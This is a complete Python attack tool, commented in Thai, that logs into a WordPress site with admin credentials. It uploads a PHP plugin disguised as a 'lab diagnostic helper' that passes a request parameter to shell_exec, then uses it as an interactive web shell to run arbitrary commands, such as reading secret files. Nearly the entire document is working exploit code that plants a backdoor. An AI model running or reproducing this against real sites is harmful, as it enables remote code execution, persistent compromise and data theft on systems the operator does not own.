#!/usr/bin/env python3
"""WordPress admin -> RCE via malicious plugin upload.

ใช้เมื่อได้ credential ของ user ที่มีสิทธิ์ ``install_plugins`` (admin)
สคริปต์จะสร้าง plugin PHP ขนาดเล็ก อัปโหลดผ่านหน้า Plugins > Add New > Upload
แล้วเรียกไฟล์ plugin ตรงๆ เพื่อรันคำสั่ง shell บนเครื่องเป้าหมาย

ตัวอย่าง
-------
python tools/wordpress_admin_rce.py --url http://target --user admin --pass 'P@ssw0rd' --cmd id
python tools/wordpress_admin_rce.py --url http://target --user admin --pass 'P@ssw0rd' --cmd "cat /var/www/html/secret_*"
python tools/wordpress_admin_rce.py --url http://target --user admin --pass 'P@ssw0rd' --shell

หมายเหตุ:
- ต้องมีสิทธิ์ติดตั้ง plugin (ปกติคือ admin) และโฟลเดอร์ wp-content/plugins เขียนได้
- ถ้า siteurl ใน DB ชี้ไป host อื่น (เช่น IP ภายใน) ต้องใช้ allow_redirects=False
  และยึด cookie ไว้ สคริปต์นี้ทำแบบนั้นอยู่แล้ว
- ไฟล์ plugin ที่อัปโหลดเรียกตรงได้เลย ไม่ต้อง activate
"""

import argparse
import os
import re
import sys
import tempfile
import zipfile

try:
    import requests
except ImportError:
    sys.exit("ต้องติดตั้ง requests ก่อน: pip install requests")

try:  # ข้อความไทยบน Windows console (cp874)
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass


PLUGIN_PHP = """<?php
/*
Plugin Name: SEC Helper
Description: lab diagnostic helper
Version: 1.0
Author: lab
*/

if (isset($_REQUEST['c'])) {
    header('Content-Type: text/plain; charset=utf-8');
    echo shell_exec($_REQUEST['c'] . ' 2>&1');
    exit;
}
"""

PLUGIN_README = """=== SEC Helper ===
Contributors: lab
Tags: helper
Requires at least: 4.0
Tested up to: 5.0
Stable tag: 1.0
License: GPLv2

diagnostic helper plugin.
"""


def build_plugin(slug, tmpdir):
    root = os.path.join(tmpdir, slug)
    os.makedirs(root, exist_ok=True)
    with open(os.path.join(root, slug + ".php"), "w", encoding="utf-8", newline="\n") as fh:
        fh.write(PLUGIN_PHP)
    with open(os.path.join(root, "readme.txt"), "w", encoding="utf-8", newline="\n") as fh:
        fh.write(PLUGIN_README)
    archive = os.path.join(tmpdir, slug + ".zip")
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
        for name in (slug + ".php", "readme.txt"):
            zf.write(os.path.join(root, name), slug + "/" + name)
    return archive


def login(session, base, user, password):
    session.cookies.set("wordpress_test_cookie", "WP Cookie check")
    session.get(base + "/wp-login.php", timeout=20)
    data = {
        "log": user,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": base + "/wp-admin/",
        "testcookie": "1",
    }
    session.post(base + "/wp-login.php", data=data, timeout=20, allow_redirects=False)
    if not any("wordpress_logged_in" in c.name for c in session.cookies):
        raise SystemExit("[-] login failed: ไม่ได้ cookie wordpress_logged_in (ตรวจ user/pass/URL)")
    chk = session.get(base + "/wp-admin/", timeout=20, allow_redirects=False)
    if chk.status_code != 200 or "dashboard" not in chk.text.lower():
        raise SystemExit("[-] login ได้แต่เข้า wp-admin ไม่ได้ (สิทธิ์ไม่พอ หรือ redirect ผิด host)")
    print("[+] logged in as %s (wp-admin OK)" % user)


def upload(session, base, archive):
    r = session.get(base + "/wp-admin/plugin-install.php?tab=upload", timeout=30)
    if r.status_code != 200:
        raise SystemExit("[-] เปิดหน้า upload plugin ไม่ได้: %s" % r.status_code)
    m = re.search(r'name="_wpnonce" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] ไม่พบ _wpnonce (หน้านี้ถูกปิดหรือสิทธิ์ไม่พอ)")
    with open(archive, "rb") as fh:
        files = {"pluginzip": (os.path.basename(archive), fh, "application/zip")}
        data = {"_wpnonce": m.group(1), "install-plugin-submit": "Install Now"}
        r = session.post(base + "/wp-admin/update.php?action=upload-plugin",
                         data=data, files=files, timeout=120, allow_redirects=False)
    text = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text))
    if "Plugin installed successfully" in text or "installed successfully" in text:
        print("[+] plugin installed")
    elif "exists" in text.lower() or "already" in text.lower():
        print("[*] plugin มีอยู่แล้ว ใช้ของเดิมต่อ")
    else:
        print("[*] upload response: %s -> %s" % (r.status_code, text[:160]))


def run(session, base, slug, cmd):
    url = "%s/wp-content/plugins/%s/%s.php" % (base, slug, slug)
    r = session.get(url, params={"c": cmd}, timeout=90)
    if r.status_code != 200:
        return "[!] HTTP %s: %s" % (r.status_code, url)
    return r.text


def main():
    ap = argparse.ArgumentParser(description="WordPress admin -> plugin upload RCE")
    ap.add_argument("--url", required=True, help="http://target")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--pass", dest="password", default="password")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--slug", default="secwp", help="ชื่อโฟลเดอร์/ไฟล์ plugin")
    ap.add_argument("--shell", action="store_true", help="อ่านคำสั่งจาก stdin วนไปเรื่อยๆ")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    slug = re.sub(r"[^a-z0-9_\-]", "", args.slug.lower()) or "secwp"

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    login(session, base, args.user, args.password)

    with tempfile.TemporaryDirectory() as tmp:
        archive = build_plugin(slug, tmp)
        upload(session, base, archive)

    print("[*] shell: %s/wp-content/plugins/%s/%s.php?c=<cmd>" % (base, slug, slug))
    if args.shell:
        try:
            while True:
                cmd = input("wp$ ").strip()
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    break
                print(run(session, base, slug, cmd))
        except (EOFError, KeyboardInterrupt):
            print()
    else:
        print(run(session, base, slug, args.cmd))


if __name__ == "__main__":
    main()
